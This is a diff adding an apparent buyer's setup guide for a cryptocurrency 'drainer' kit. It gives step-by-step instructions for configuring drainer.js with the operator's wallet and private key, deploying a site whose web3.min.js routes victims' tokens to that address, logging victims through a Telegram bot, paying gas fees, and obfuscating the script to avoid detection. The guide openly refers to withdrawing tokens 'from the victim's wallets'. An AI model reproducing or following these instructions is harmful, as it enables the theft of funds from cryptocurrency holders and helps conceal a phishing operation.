@@ -1,0 +1,52 @@
+Hi , thanks for buying !
+
+To begin with, set up the software to write off coins-tokens, open the file in the archive Soft.rar drainer.js and fill in three fields: wallet address, private wallet key (needed to withdraw tokens from the victim's wallets) and the address of the site where the drainer itself will stand (as in the example, with http or https).
+
+Save the file, then download Node JS (LTS version), you can run it on Windows
+
+After installing Node JS, open the console, enter the command to go to the folder where we have the software for writing tokens.
+
+cd path/to/folder/software
+
+Then type in the console: npm install
+
+Wait for the libraries to be installed and that's it, the handler is ready now
+
+Now customize the site, namely open the file web3.min.js in the folder assets/js and replace the receiver_address with your address, which specified in the handler, they must be the same, save and close
+
+And it is also necessary to specify the token from ankr (P.s find out here https://www.ankr.com/rpc/advanced-api).
+Then open web3.min.js and look for line 271 and replace the word ANKR_TOKEN with your token. 
+
+Then open logging.php in the root of the site, enter there the data tg bot and chat aidi, as in the last time, save, now pour the site on hosting and check workability
+
+If everything works, again go to the console, where we configured the software for cheating coin-tokens, and run it to display confirmed tokens, command:
+
+node drainer.js
+
+The line "Drainer by HHH" should appear, the main thing is that no errors appear, if there are no errors, everything is ok.
+
+Plus for tokens to be successfully withdrawn it will be necessary to put some ETH and BNB, about 10 - 15 dollars in each of the networks, this money will go to the commission when withdrawing tokens
+
+
+After I put the site on the host 
+do the following 
+
+
+1. Go to the site: https://obfuscator.io/
+2. Insert the code from web3.min.js when you have already entered the wallet
+3. Options Preset (Select High)
+4. Click Obfuscate 
+5. Copy the code and paste it into web3.min.js
+
+
+
+How to customize the Bot
+
+1. Go to logging.php 
+2. Enter the bot token and your chat id. 
+3. Later go to assets/js/web3.min.js 
+4. Enter your wallet 
+5. Done !
+
+
+Now it's done. 
